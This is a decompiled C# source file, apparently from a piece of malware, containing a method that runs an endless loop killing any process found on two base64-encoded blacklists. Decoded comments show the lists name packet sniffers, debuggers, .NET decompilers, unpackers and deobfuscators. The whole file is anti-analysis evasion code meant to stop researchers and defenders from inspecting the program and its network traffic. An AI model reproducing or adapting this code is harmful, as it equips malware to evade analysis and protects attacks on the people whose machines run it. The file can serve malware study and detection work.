using System;
using System.Collections.Generic;
using System.Threading;

namespace MufMaOSvGyvz
{
	// Token: 0x02000022 RID: 34
	public class Process
	{
		// Token: 0x060000BE RID: 190
		public static void KillBlacklistProcess()
		{
			for (;;)
			{
				try
				{
					for (int i = 0; i < Process.TFTOLPlcwmHYnq.Count; i++)
					{
						int index = i;
						for (int j = 0; j < Process.JzzxbjfrmJe.Count; j++)
						{
							int index2 = j;
							ProcessKill.KillProcess(Process.TFTOLPlcwmHYnq[index], Process.JzzxbjfrmJe[index2]);
						}
					}
					Thread.Sleep(100);
				}
				catch
				{
				}
			}
		}

		// Token: 0x04000084 RID: 132
		private static readonly List<string> TFTOLPlcwmHYnq = new List<string>
		{
			MainCore.DecodeBase64("aHR0cCBhbmFseXplciBzdGFuZC1hbG9uZQ=="), // -> http analyzer stand-alone
			MainCore.DecodeBase64("ZmlkZGxlcg=="), // -> fiddler
			MainCore.DecodeBase64("ZWZmZXRlY2ggaHR0cCBzbmlmZmVy"), // -> effetech http sniffer
			MainCore.DecodeBase64("ZmlyZXNoZWVw"), // -> firesheep
			MainCore.DecodeBase64("SUVXYXRjaCBQcm9mZXNzaW9uYWw="), // -> IEWatch Professional
			MainCore.DecodeBase64("ZHVtcGNhcA=="), // -> dumpcap
			MainCore.DecodeBase64("d2lyZXNoYXJr"), // -> wireshark
			MainCore.DecodeBase64("d2lyZXNoYXJrIHBvcnRhYmxl"), // -> wireshark portable
			MainCore.DecodeBase64("c3lzaW50ZXJuYWxzIHRjcHZpZXc="), // -> sysinternals tcpview
			MainCore.DecodeBase64("TmV0d29ya01pbmVy"), // -> NetworkMiner
			MainCore.DecodeBase64("TmV0d29ya1RyYWZmaWNWaWV3"), // -> NetworkTrafficView
			MainCore.DecodeBase64("SFRUUE5ldHdvcmtTbmlmZmVy"), // -> HTTPNetworkSniffer
			MainCore.DecodeBase64("dGNwZHVtcA=="), // -> tcpdump
			MainCore.DecodeBase64("aW50ZXJjZXB0ZXI="), // -> intercepter
			MainCore.DecodeBase64("SW50ZXJjZXB0ZXItTkc="), // -> Intercepter-NG
			MainCore.DecodeBase64("b2xseWRiZw=="), // -> ollydbg
			MainCore.DecodeBase64("eDY0ZGJn"), // -> x64dbg
			MainCore.DecodeBase64("eDMyZGJn"), // -> x32dbg
			MainCore.DecodeBase64("ZG5zcHk="), // -> dnspy
			MainCore.DecodeBase64("ZG5zcHkteDg2"), // -> dnspy-x86
			MainCore.DecodeBase64("ZGU0ZG90"), // -> de4dot
			MainCore.DecodeBase64("aWxzcHk="), // -> ilspy
			MainCore.DecodeBase64("ZG90cGVlaw=="), // -> dotpeek
			MainCore.DecodeBase64("ZG90cGVlazY0"), // -> dotpeek64
			MainCore.DecodeBase64("aWRhNjQ="), // -> ida64
			MainCore.DecodeBase64("cHJvY2V4cA=="), // -> procexp
			MainCore.DecodeBase64("cHJvY2V4cDY0"), // -> procexp64
			MainCore.DecodeBase64("UkRHIFBhY2tlciBEZXRlY3Rvcg=="), // -> RDG Packer Detector
			MainCore.DecodeBase64("Q0ZGIEV4cGxvcmVy"), // -> CFF Explorer
			MainCore.DecodeBase64("UEVpRA=="), // -> PEiD
			MainCore.DecodeBase64("cHJvdGVjdGlvbl9pZA=="), // -> protection_id
			MainCore.DecodeBase64("TG9yZFBF"), // -> LordPE
			MainCore.DecodeBase64("cGUtc2lldmU="), // -> pe-sieve
			MainCore.DecodeBase64("TWVnYUR1bXBlcg=="), // -> MegaDumper
			MainCore.DecodeBase64("VW5Db25mdXNlckV4"), // -> UnConfuserEx
			MainCore.DecodeBase64("VW5pdmVyc2FsX0ZpeGVy"), // -> Universal_Fixer
			MainCore.DecodeBase64("Tm9GdXNlckV4") // -> NoFuserEx
		};

		// Token: 0x04000085 RID: 133
		private static readonly List<string> JzzxbjfrmJe = new List<string>
		{
			MainCore.DecodeBase64("TmV0d29ya01pbmVy"), // -> NetworkMiner
			MainCore.DecodeBase64("TmV0d29ya1RyYWZmaWNWaWV3"), // -> NetworkTrafficView
			MainCore.DecodeBase64("SFRUUE5ldHdvcmtTbmlmZmVy"), // -> HTTPNetworkSniffer
			MainCore.DecodeBase64("dGNwZHVtcA=="), // -> tcpdump
			MainCore.DecodeBase64("aW50ZXJjZXB0ZXI="), // -> intercepter
			MainCore.DecodeBase64("SW50ZXJjZXB0ZXItTkc=") // -> Intercepter-NG
		};
	}
}
